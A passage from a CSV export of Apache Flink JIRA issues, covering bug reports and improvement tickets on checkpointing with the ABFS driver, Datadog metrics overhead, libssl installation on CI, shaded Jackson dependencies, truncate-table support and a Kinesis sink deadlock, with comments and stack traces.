[http://codespeed.dak8s.net:8080/job/flink-master-benchmarks-regression-check/1633] ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 05 13:05:00 UTC 2023,,,,,,,,,,"0|z1ia9k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"02/Jun/23 02:42;wanglijie;{code:java}
[2023-06-01T11:38:20.703Z] Traceback (most recent call last):
[2023-06-01T11:38:20.703Z]   File ""./regression_report_v2.py"", line 110, in <module>
[2023-06-01T11:38:20.703Z]     checkBenchmark(args, exe, benchmark)
[2023-06-01T11:38:20.703Z]   File ""./regression_report_v2.py"", line 84, in checkBenchmark
[2023-06-01T11:38:20.703Z]     args.minInstabilityMultiplier, direction)
[2023-06-01T11:38:20.703Z]   File ""./regression_report_v2.py"", line 54, in detectRegression
[2023-06-01T11:38:20.703Z]     sustainable_x = [min(scores[i - 3: i]) for i in range(3, baselineSize)]
[2023-06-01T11:38:20.703Z] ValueError: min() arg is an empty sequence
{code};;;","02/Jun/23 05:44;wanglijie;cc [~Yanfei Lei];;;","05/Jun/23 13:05;martijnvisser;Fixed in flink-benchmarks:master

7fae796e18f40e9fae5f53b16d763dfbdcba37e9;;;",,,,,,,,,,,,,,,,,,,,
Bump okhttp version to 4.11.0,FLINK-32243,13538492,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,ConradJam,ConradJam,02/Jun/23 02:05,06/Jun/23 10:49,04/Jun/24 20:41,06/Jun/23 10:49,,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,Bump kubernetes operator okhttp  version to 4.11.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 06 10:49:19 UTC 2023,,,,,,,,,,"0|z1ia8w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 10:49;gyfora;merged to main 5c63b1338f8f2a4e956ad59994bd9be6ce8d3881;;;",,,,,,,,,,,,,,,,,,,,,,
Datadog HTTP Reporter produces a huge outgoing traffic and CPU overhead,FLINK-32242,13538446,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,mathieude,mathieude,01/Jun/23 16:29,01/Jun/23 16:35,04/Jun/24 20:41,,1.15.2,,,,,,,,,,,,,,,,,,,,Runtime / Metrics,,,,0,,,,"We're running a relatively small flink cluster (7 task-managers * 8 cores) and are using datadog for telemetry.

The numbers for outgoing traffic, between kafka producers, tasks activities, and host system metrics didn't add-up. After investigation, we discovered that this traffic was generated by the DatadogHttpReporter.

We switched the reporter to an implementation using the java dogstatsd client (reporting to a datadog agent on each host).

Here are some numbers of outgoing traffic taken at a NAT gateway, between the cluster and the outside world. Before/after this change (all other things being equal):

!image-2023-06-01-17-56-50-809.png!

We're talking about 850MB in 5mn, so 10GB/h overhead here. That kind of traffic is not free on AWS...

Here is the change on `{{{}flink.taskmanager.Status.JVM.CPU.Load{}}}` (over the whole cluster)

!image-2023-06-01-17-54-45-900.png!

Reporting telemetry in json over http has a *HUGE* overhead.

So I would strongly advocate to deprecate this reporter, and recommend users to use a dogstatsd-based implementation. There exist one ([https://github.com/aroch/flink-metrics-dogstatsd,] not tested). On our side, we developed our own that we can share if requested.

 

 ","Flink 1.15.2, AWS EMR.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Jun/23 15:54;mathieude;image-2023-06-01-17-54-45-900.png;https://issues.apache.org/jira/secure/attachment/13058707/image-2023-06-01-17-54-45-900.png","01/Jun/23 15:56;mathieude;image-2023-06-01-17-56-50-809.png;https://issues.apache.org/jira/secure/attachment/13058706/image-2023-06-01-17-56-50-809.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 01 16:35:12 UTC 2023,,,,,,,,,,"0|z1i9yo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"01/Jun/23 16:35;sap1ens;This is not surprising. I've already tried to contribute the agent-based reporter a while ago in FLINK-25164 ([the PR|https://github.com/apache/flink/pull/18012] is still open), but it was rejected because it was ""more code"" without adding significant value 🤷‍♂️.;;;",,,,,,,,,,,,,,,,,,,,,,
UnsupportedFileSystemException when using the ABFS Hadoop driver for checkpointing in Flink 1.17,FLINK-32241,13538421,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,_anton,_anton,01/Jun/23 13:34,03/Jan/24 09:09,04/Jun/24 20:41,,1.17.0,1.17.1,,,,,,,,,,,,,,,,,,,FileSystems,Runtime / Checkpointing,,,0,,,,"https://issues.apache.org/jira/browse/HADOOP-18707 introduced a new functionality in the ABFS Hadoop client which buffers data on local disk by default.

It looks like this breaks with Flink 1.17 in a scenario where:
 * ABFS is used for checkpointing
 * JobManager HA is enabled
 * First JobManager leader dies and a stand-by JobManager takes over

I can reliably reproduce this with Flink 1.17.1 running on Kubernetes by simply killing the JM leader pod. Once the stand-by JobManager takes over, all checkpoints consistently fail with the following error:
{noformat}
org.apache.flink.runtime.checkpoint.CheckpointException: Failure to finalize checkpoint. at org.apache.flink.runtime.checkpoint.CheckpointCoordinator.finalizeCheckpoint(CheckpointCoordinator.java:1424) at org.apache.flink.runtime.checkpoint.CheckpointCoordinator.completePendingCheckpoint(CheckpointCoordinator.java:1310) at org.apache.flink.runtime.checkpoint.CheckpointCoordinator.receiveAcknowledgeMessage(CheckpointCoordinator.java:1202) at org.apache.flink.runtime.scheduler.ExecutionGraphHandler.lambda$acknowledgeCheckpoint$1(ExecutionGraphHandler.java:89) at org.apache.flink.runtime.scheduler.ExecutionGraphHandler.lambda$processCheckpointCoordinatorMessage$3(ExecutionGraphHandler.java:119) at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) at java.base/java.lang.Thread.run(Thread.java:829) Caused by: org.apache.hadoop.fs.UnsupportedFileSystemException: No FileSystem for scheme ""file"" at org.apache.hadoop.fs.FileSystem.getFileSystemClass(FileSystem.java:3443) at org.apache.hadoop.fs.FileSystem.createFileSystem(FileSystem.java:3466) at org.apache.hadoop.fs.FileSystem.access$300(FileSystem.java:174) at org.apache.hadoop.fs.FileSystem$Cache.getInternal(FileSystem.java:3574) at org.apache.hadoop.fs.FileSystem$Cache.get(FileSystem.java:3521) at org.apache.hadoop.fs.FileSystem.get(FileSystem.java:540) at org.apache.hadoop.fs.FileSystem.getLocal(FileSystem.java:496) at org.apache.hadoop.fs.LocalDirAllocator$AllocatorPerContext.confChanged(LocalDirAllocator.java:316) at org.apache.hadoop.fs.LocalDirAllocator$AllocatorPerContext.getLocalPathForWrite(LocalDirAllocator.java:393) at org.apache.hadoop.fs.LocalDirAllocator.getLocalPathForWrite(LocalDirAllocator.java:165) at org.apache.hadoop.fs.LocalDirAllocator.getLocalPathForWrite(LocalDirAllocator.java:146) at org.apache.hadoop.fs.store.DataBlocks$DiskBlockFactory.createTmpFileForWrite(DataBlocks.java:980) at org.apache.hadoop.fs.store.DataBlocks$DiskBlockFactory.create(DataBlocks.java:960) at org.apache.hadoop.fs.azurebfs.services.AbfsOutputStream.createBlockIfNeeded(AbfsOutputStream.java:262) at org.apache.hadoop.fs.azurebfs.services.AbfsOutputStream.<init>(AbfsOutputStream.java:173) at org.apache.hadoop.fs.azurebfs.AzureBlobFileSystemStore.createFile(AzureBlobFileSystemStore.java:580) at org.apache.hadoop.fs.azurebfs.AzureBlobFileSystem.create(AzureBlobFileSystem.java:301) at org.apache.hadoop.fs.FileSystem.create(FileSystem.java:1195) at org.apache.hadoop.fs.FileSystem.create(FileSystem.java:1175) at org.apache.hadoop.fs.FileSystem.create(FileSystem.java:1064) at org.apache.flink.fs.azure.common.hadoop.HadoopFileSystem.create(HadoopFileSystem.java:154) at org.apache.flink.fs.azure.common.hadoop.HadoopFileSystem.create(HadoopFileSystem.java:37) at org.apache.flink.core.fs.PluginFileSystemFactory$ClassLoaderFixingFileSystem.create(PluginFileSystemFactory.java:170) at org.apache.flink.runtime.state.filesystem.FSDataOutputStreamWrapper.<init>(FSDataOutputStreamWrapper.java:42) at org.apache.flink.runtime.state.filesystem.FsCheckpointMetadataOutputStream.getOutputStreamWrapper(FsCheckpointMetadataOutputStream.java:179) at org.apache.flink.runtime.state.filesystem.FsCheckpointMetadataOutputStream.<init>(FsCheckpointMetadataOutputStream.java:64) at org.apache.flink.runtime.state.filesystem.FsCheckpointStorageLocation.createMetadataOutputStream(FsCheckpointStorageLocation.java:116) at org.apache.flink.runtime.checkpoint.PendingCheckpoint.finalizeCheckpoint(PendingCheckpoint.java:330) at org.apache.flink.runtime.checkpoint.CheckpointCoordinator.finalizeCheckpoint(CheckpointCoordinator.java:1410) ... 7 common frames omitted{noformat}
I am not exactly sure why this works with the first JM and why all of a sudden the local Hadoop FS implementation cannot be loaded on a stand-by JM... I am running with default settings when it comes to Hadoop FS etc.

Anyway, I found a workaround thanks to https://issues.apache.org/jira/browse/SPARK-43188: simply setting {{fs.azure.data.blocks.buffer}} to {{array}} seems to solve the issue. So this is minor priority.","Flink 1.17.1

Hadoop 3.3.4

Flink Operator 1.4.0

Kubernetes 1.24",,,,,,,,,,,,,,,,,,,,,,,,,FLINK-30635,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jan 03 09:09:02 UTC 2024,,,,,,,,,,"0|z1i9tc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"01/Jun/23 15:15;stevel@apache.org;this is odd as the buffer to disk code is derived from what's been in the s3a connector for years and it never blew up.

on a host without the abfs change, can you grab the cloudstore module and run its storediag command to get a view of the world, including probes of temp dirs ... look for the output under ""Output Buffering"" to see

https://github.com/steveloughran/cloudstore
;;;","02/Jun/23 02:34;luoyuxia;Seems the root cause is similar to FLINK-30635?;;;","05/Jun/23 08:38;masteryhx;setting {{fs.azure.data.blocks.buffer}} to {{array}} makes abfs use memory to cache instead of local disk so that it doesn't need localfilesystem.
it may also works if setting _fs.file.impl_ to _org.apache.hadoop.fs.LocalFileSystem.class.getName()_ explicitly (It may be a shaded path).;;;","05/Jun/23 13:02;luoyuxia;I think the root cause maynot similar to FLINK-30635.

I suspect it may be caused by the different class loader.

From the excpetion and hadoop code, we can know the result of `ServiceLoader.load(FileSystem.class)` is empty although there should be LocalFileSystem since hadoop-common is on classpaths. Since it's emty, it can't find the FileSystem for scheme ""file"", so it throw `org.apache.hadoop.fs.UnsupportedFileSystemException: No FileSystem for scheme ""file"" at `.

I'm trying to understand why `ServiceLoader.load(FileSystem.class)` is empty. I'm not very sure, but from the stack strace and flink plugin mechanism, the class `FileSystem` is loaded by `PluginClassLoader`, and `ServiceLoader.load(FileSystem.class)`  will try to use `
Thread.currentThread().getContextClassLoader()` which maybe appclassloader  to load the `FileSystem.class`. Since they are different classloaders, the result is empty.
If that's the case, I think you may can set `plugin.classloader.parent-first-patterns.additional`  = `org.apache.hadoop.` to enforce FileSystem.class to be loaded by appclassloader.

 

 ;;;","10/Jul/23 15:18;asardaes;[I am seeing this same issue without standby JMs|https://lists.apache.org/thread/24228yww7bz5kskx5zkjt1fwkvh47dqs], at some point the JM pod restarts and then all checkpoints and savepoints fail even if I restart all JM and TM pods manually. I don't think this counts as ""minor"" since, once it happens, it makes the job crashloop until we do some manual intervention.

[~_anton] where did you set {{fs.azure.data.blocks.buffer}}? Does Flink forward it if I place that in {{flink-conf.yaml}}?

EDIT: [found the answer|https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/deployment/filesystems/azure/#wasb], yes it does.;;;","03/Jan/24 09:09;martijnvisser;[~luoyuxia] Have you looked more into this topic?;;;",,,,,,,,,,,,,,,,,
Update Flink client to 1.17.1,FLINK-32240,13538417,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,gyfora,gyfora,gyfora,01/Jun/23 13:03,06/Jun/23 12:16,04/Jun/24 20:41,06/Jun/23 12:16,,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,With Flink 1.17.1 released we should update the operator flink dependency,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 06 12:16:21 UTC 2023,,,,,,,,,,"0|z1i9sg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 12:16;gyfora;merged to main 20b86883ca07e886cefd6ff149444f33fd36b961;;;",,,,,,,,,,,,,,,,,,,,,,
Unify TestJvmProcess and TestProcessBuilder,FLINK-32239,13538414,,Technical Debt,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,samrat007,chesnay,chesnay,01/Jun/23 12:48,14/Mar/24 07:36,04/Jun/24 20:41,,,,,,,,,,,,,,,,1.20.0,,,,,,Test Infrastructure,,,,1,stale-assigned,starter,,"Both of these utility classes are used to spawn additional JVM processes during tests, and contain a fair bit of duplicated logic. We can unify them to ease maintenance.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 10 22:35:10 UTC 2023,,,,,,,,,,"0|z1i9rs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/Jun/23 05:56;samrat007;Hi [~chesnay] , 

Can i pick this minor improvement ? 

Thank you ;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,,,,
Stable approach for installing libssl,FLINK-32238,13538403,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,01/Jun/23 12:03,13/Jun/23 15:13,04/Jun/24 20:41,13/Jun/23 15:12,,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Test Infrastructure,,,,0,pull-request-available,,,"I think I found a stable way to install libssl on CI.

-Update:-
-We have to update the libssl version regularly in [apache/flink:tools/azure-pipelines/e2e-template.yml:116|https://github.com/apache/flink/blob/master/tools/azure-pipelines/e2e-template.yml#L116] if the dependency gets updated (e.g. FLINK-31962).-

Have wget download all files from the director and filter the file we actually want.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 15:07:25 UTC 2023,,,,,,,,,,"0|z1i9pc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 15:07;chesnay;master: e6c751dd041e3faaeaced04ed85ceb7ac005875a
1.17: ff638c3e0861a98ae24bdbe591cb305a57a95f61
1.16: 892f3caa606da046afe5637f3f58d791a9df4974;;;",,,,,,,,,,,,,,,,,,,,,,
add jackson-module-kotlin to Jackson packages that get shaded,FLINK-32237,13538384,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Not A Problem,,singingbush,singingbush,01/Jun/23 09:43,01/Jun/23 13:36,04/Jun/24 20:41,01/Jun/23 13:19,1.17.1,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"Because of the shaded Jackson packages having their package names prefixed, such as 
{_}org.apache.flink.shaded.jackson2.com.fasterxml.jackson.databind.json.JsonMapper{_}, when writing a Flink project in Kotlin I am unable to register the _KotlinModule_ or use {_}jacksonObjectMapper(){_}.
 
It would be great if these classes were repackaged using the same using the same _org.apache.flink.shaded.jackson2.*_ prefix:
{code:java}
import com.fasterxml.jackson.module.kotlin.KotlinModule
import com.fasterxml.jackson.module.kotlin.jacksonMapperBuilder
import com.fasterxml.jackson.module.kotlin.jacksonObjectMapper {code}
 
Due to the mismatch in package names I can do neither of the following:
{code:java}
val jsonMapper = jacksonMapperBuilder()
    .addModule(JavaTimeModule())
    .build() {code}
or
{code:java}
val jsonMapper = JsonMapper()
    .registerModule(KotlinModule()) {code}

the Kotlin module inherits from {{com.fasterxml.jackson.databind.Module}} and the re-packaged ones are inheriting from {{{}[org.apache.flink.shaded.jackson2.com|http://org.apache.flink.shaded.jackson2.com/]{}}}{{{}.fasterxml.jackson.databind.Module{}}}.

 

For now I can work around this with a wrapper class but it would be nice to have this available out of the box.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 01 13:36:37 UTC 2023,,,,,,,,,,"0|z1i9l4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"01/Jun/23 11:13;martijnvisser;[~singingbush] Why wouldn't you use Jackson directly instead of the Shaded version? The shaded artifacts are their specifically to avoid that they clash with artifacts that users might use when writing a Flin kapplication;;;","01/Jun/23 13:18;singingbush;I was under the impression that users should make use of the shaded dependencies to make sure that things work smoothly. At least that has been recommended to me in the past. If this is not the case then that makes things much simpler. Thanks for confirming;;;","01/Jun/23 13:36;martijnvisser;You should use shaded if you're building something in Flink itself yes, but not when you're building an application that will run by Flink;;;",,,,,,,,,,,,,,,,,,,,
Ease YarnTestBase allowlist address regex,FLINK-32236,13538381,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,01/Jun/23 09:27,09/Jun/23 08:56,04/Jun/24 20:41,09/Jun/23 08:56,,,,,,,,,,,,,,,1.18.0,,,,,,Deployment / YARN,Tests,,,0,pull-request-available,,,"The YarnTestBase contains allow-list items like this:
{code}Remote connection to \\[null\\] failed with java.net.ConnectException: Connection refused{code}

I've seen this exception a few times without the address being null. This could be due to difference in how Java 17 resolves addresses (?).
In any case I don't see any harm in relaxing this regex to accept any address.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 09 08:56:45 UTC 2023,,,,,,,,,,"0|z1i9kg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/Jun/23 08:56;chesnay;master: 37d686e4565a0f5d2827920d53a62da92ace1ad5;;;",,,,,,,,,,,,,,,,,,,,,,
Translate CrateDB Docs to chinese,FLINK-32235,13538367,13529468,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,yyhx,matriv,matriv,01/Jun/23 08:15,06/Jun/23 11:53,04/Jun/24 20:41,06/Jun/23 11:53,,,,,,,,,,,,,,,jdbc-3.2.0,,,,,,Connectors / JDBC,,,,0,pull-request-available,translation-zh,,Translate the newly added docs for CrateDB with [https://github.com/apache/flink-connector-jdbc/pull/29] to chinese.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 06 11:51:44 UTC 2023,,,,,,,,,,"0|z1i9hk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 08:01;yyhx;Hi, [~matriv] , I want to solve this problem, can you assign it to me?;;;","06/Jun/23 08:28;libenchao;[~yyhx] Thanks for your interest, assigned to you.;;;","06/Jun/23 11:51;libenchao;Fixed via https://github.com/apache/flink-connector-jdbc/commit/1a2186c71fb765b85cc8b9371e6b5158b9ef10b4

[~yyhx] Thanks for your work!;;;",,,,,,,,,,,,,,,,,,,,
Support execute truncate table statement,FLINK-32234,13538351,13533474,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,luoyuxia,luoyuxia,luoyuxia,01/Jun/23 04:16,29/Jun/23 03:26,04/Jun/24 20:41,29/Jun/23 03:26,,,,,,,,,,,,,,,,,,,,,Table SQL / API,Table SQL / Planner,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 03:26:02 UTC 2023,,,,,,,,,,"0|z1i9e0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 03:26;luoyuxia;master:

300902016bd41961f28dacdd9b5fd028b8edb925

f8df2d608aff7cfa4a592532cfe280139a2960ad

45ce1926274d66e98bf0141f1977cb220124e75e;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce SupportsTruncate interface,FLINK-32233,13538350,13533474,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,luoyuxia,luoyuxia,luoyuxia,01/Jun/23 04:15,19/Jun/23 09:31,04/Jun/24 20:41,19/Jun/23 09:31,,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 19 09:31:30 UTC 2023,,,,,,,,,,"0|z1i9ds:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/Jun/23 09:31;luoyuxia;master: 1a3151b5b9f1df8aaa221b2febfae0431a69b95d;;;",,,,,,,,,,,,,,,,,,,,,,
Supports parse truncate table statement,FLINK-32232,13538349,13533474,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,luoyuxia,luoyuxia,luoyuxia,01/Jun/23 04:12,08/Jun/23 08:31,04/Jun/24 20:41,08/Jun/23 08:30,,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 08 08:30:49 UTC 2023,,,,,,,,,,"0|z1i9dk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/Jun/23 08:30;luoyuxia;master:

379e4910547cbbcf79dcbb251aa4b3c1cf80c6a0;;;",,,,,,,,,,,,,,,,,,,,,,
libssl not found when running CI,FLINK-32231,13538322,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,Sergey Nuyanzin,Sergey Nuyanzin,Sergey Nuyanzin,31/May/23 20:34,01/Jun/23 12:02,04/Jun/24 20:41,31/May/23 23:53,1.16.3,1.17.2,1.18.0,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Build System / CI,,,,0,pull-request-available,test-stability,,"{noformat}
--2023-05-31 19:10:13--  http://security.ubuntu.com/ubuntu/pool/main/o/openssl1.0/libssl1.0.0_1.0.2n-1ubuntu5.12_amd64.deb
Resolving security.ubuntu.com (security.ubuntu.com)... 185.125.190.39, 91.189.91.38, 91.189.91.39, ...
Connecting to security.ubuntu.com (security.ubuntu.com)|185.125.190.39|:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2023-05-31 19:10:13 ERROR 404: Not Found.

{noformat}
e.g.
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49523&view=logs&j=bea52777-eaf8-5663-8482-18fbc3630e81&t=d6e79740-7cf7-5407-2e69-ca34c9be0efb&l=265",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 31 23:53:04 UTC 2023,,,,,,,,,,"0|z1i97k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"31/May/23 23:53;Sergey Nuyanzin;Merged as:
master: cc552f970e2673f2895ca3c73a8150cdf720915a

1.17: 084898b4dad52b389a94cd0d7b76414cb7adf3e4

1.16: 8457af8fd0caaff7b3a2e90d89af28239dece5df;;;",,,,,,,,,,,,,,,,,,,,,,
Deadlock in AWS Kinesis Data Streams AsyncSink connector,FLINK-32230,13538268,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,antoniovespoli,antoniovespoli,antoniovespoli,31/May/23 12:52,19/Oct/23 11:19,04/Jun/24 20:41,19/Oct/23 11:19,1.15.4,1.16.2,1.17.1,aws-connector-3.0.0,aws-connector-4.1.0,,,,,,,,,,aws-connector-3.1.0,aws-connector-4.2.0,,,,,Connectors / AWS,,,,0,pull-request-available,,,"Connector calls to AWS Kinesis Data Streams can hang indefinitely without making any progress.

We suspect the root cause to be related to the SDK handling of exceptions, similarly to what observed in FLINK-31675.

We identified this deadlock on applications running on AWS Kinesis Data Analytics using the AWS Kinesis Data Streams AsyncSink (with AWS SDK version 2.20.32 as per FLINK-31675). The deadlock scenario is still the same as described in FLINK-31675. However, the Netty content-length exception does not appear when using the updated SDK version.

This issue only occurs for applications and streams in the AWS regions _ap-northeast-3_ and {_}us-gov-east-1{_}. We did not observe this issue in any other AWS region.

The issue happens sporadically and unpredictably. As per its nature, we do not have instructions for reproducing it.

Example of flame-graphs observed when the issue occurs:
{code:java}
root
java.lang.Thread.run:829
org.apache.flink.runtime.taskmanager.Task.run:568
org.apache.flink.runtime.taskmanager.Task.doRun:746
org.apache.flink.runtime.taskmanager.Task.restoreAndInvoke:932
org.apache.flink.runtime.taskmanager.Task.runWithSystemExitMonitoring:953
org.apache.flink.runtime.taskmanager.Task$$Lambda$1253/0x0000000800ecbc40.run:-1
org.apache.flink.streaming.runtime.tasks.StreamTask.invoke:753
org.apache.flink.streaming.runtime.tasks.StreamTask.runMailboxLoop:804
org.apache.flink.streaming.runtime.tasks.mailbox.MailboxProcessor.runMailboxLoop:203
org.apache.flink.streaming.runtime.tasks.StreamTask$$Lambda$907/0x0000000800bf7840.runDefaultAction:-1
org.apache.flink.streaming.runtime.tasks.StreamTask.processInput:519
org.apache.flink.streaming.runtime.io.StreamOneInputProcessor.processInput:65
org.apache.flink.streaming.runtime.io.AbstractStreamTaskNetworkInput.emitNext:110
org.apache.flink.streaming.runtime.io.checkpointing.CheckpointedInputGate.pollNext:159
org.apache.flink.streaming.runtime.io.checkpointing.CheckpointedInputGate.handleEvent:181
org.apache.flink.streaming.runtime.io.checkpointing.SingleCheckpointBarrierHandler.processBarrier:231
org.apache.flink.streaming.runtime.io.checkpointing.SingleCheckpointBarrierHandler.markCheckpointAlignedAndTransformState:262
org.apache.flink.streaming.runtime.io.checkpointing.SingleCheckpointBarrierHandler$$Lambda$1586/0x00000008012c5c40.apply:-1
org.apache.flink.streaming.runtime.io.checkpointing.SingleCheckpointBarrierHandler.lambda$processBarrier$2:234
org.apache.flink.streaming.runtime.io.checkpointing.AbstractAlignedBarrierHandlerState.barrierReceived:66
org.apache.flink.streaming.runtime.io.checkpointing.AbstractAlignedBarrierHandlerState.triggerGlobalCheckpoint:74
